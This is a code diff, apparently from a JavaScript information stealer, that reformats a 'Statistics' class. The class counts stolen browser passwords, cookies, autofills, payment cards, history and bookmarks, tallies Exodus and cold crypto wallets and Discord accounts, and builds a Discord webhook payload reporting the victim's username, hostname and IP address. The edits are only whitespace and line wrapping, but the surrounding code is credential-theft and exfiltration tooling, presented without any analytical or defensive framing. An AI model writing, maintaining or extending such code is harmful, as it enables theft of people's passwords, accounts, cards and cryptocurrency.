@@ -56,7 +56,7 @@ class Statistics {
      */
     addBrowser(browserData) {
         const { passwords, cookies, autofills, cards, history, downloads, bookmarks } = browserData;
-        
+
         this.data.browsers.passwords += passwords || 0;
         this.data.browsers.cookies += cookies || 0;
         this.data.browsers.autofills += autofills || 0;
@@ -64,7 +64,7 @@ class Statistics {
         this.data.browsers.history += history || 0;
         this.data.browsers.downloads += downloads || 0;
         this.data.browsers.bookmarks += bookmarks || 0;
-        
+
         logger.debug('Browser statistics updated', browserData);
     }
 
@@ -205,7 +205,8 @@ class Statistics {
                 totalPasswords: this.data.browsers.passwords,
                 totalCookies: this.data.browsers.cookies,
                 totalGames: this.data.collections.games.length,
-                totalWallets: this.data.collections.exodus.length + this.data.collections.colds.length,
+                totalWallets:
+                    this.data.collections.exodus.length + this.data.collections.colds.length,
                 totalDiscordAccounts: this.data.discord.accounts.length,
                 timestamp: this.data.system.timestamp
             },
@@ -221,7 +222,7 @@ class Statistics {
 
     /**
      * Build Discord webhook payload
-     * @param {string} username - Username  
+     * @param {string} username - Username
      * @param {string} hostname - Hostname
      * @param {string} ip - IP address
      * @param {string} link - Optional file link
@@ -229,17 +230,15 @@ class Statistics {
      */
     buildWebhookPayload(username, hostname, ip, _link = '') {
         const stats = this.getFormattedStats();
-        
+
         // Use actual Discord account data if available
-        const discordAccount = this.data.discord.accounts.length > 0 ? this.data.discord.accounts[0] : null;
-        
+        const discordAccount =
+            this.data.discord.accounts.length > 0 ? this.data.discord.accounts[0] : null;
+
         if (!discordAccount) {
             // Return minimal webhook for non-Discord data using EmbedBuilder
-            const systemEmbed = EmbedBuilder.createSystemEmbed(
-                { username, hostname, ip },
-                stats
-            );
-            
+            const systemEmbed = EmbedBuilder.createSystemEmbed({ username, hostname, ip }, stats);
+
             return JSON.stringify({
                 content: null,
                 embeds: [systemEmbed],
